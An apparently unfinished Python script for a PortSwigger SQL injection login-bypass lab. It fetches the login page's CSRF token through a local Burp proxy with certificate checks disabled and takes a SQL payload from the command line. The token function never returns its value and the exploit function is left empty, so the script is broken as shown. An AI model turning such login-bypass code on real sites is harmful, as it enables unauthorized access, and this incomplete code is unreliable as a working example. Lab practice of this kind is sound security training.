import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Lab link: https://portswigger.net/web-security/sql-injection/lab-login-bypass

# To redirect traffic to burpsuite
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def get_csrf_token(s, url):
    # Perform the get request to the /login page
    # Send requests and responses through the proxy for debugging in Burp
    r = s.get(url, verify=False, proxies=proxies)

    # Parse the csrf token from the HTML response using BeautifulSoup
    soup = BeautifulSoup(r.content, 'html.parser')

    # The csrf token is located in the first input element
    # within the value field
    # print(soup)
    csrf = soup.find('input', {'name': 'csrf'})['value']
    print(csrf)


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    #inc



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage %s <url> <sql-payloads>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' %sys.argv[0])

    # Needed to allow parameter persistence across the session
    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! \
        Now logged in as the administrator user.')

    else:
        print('[-] SQL injection unccessful.')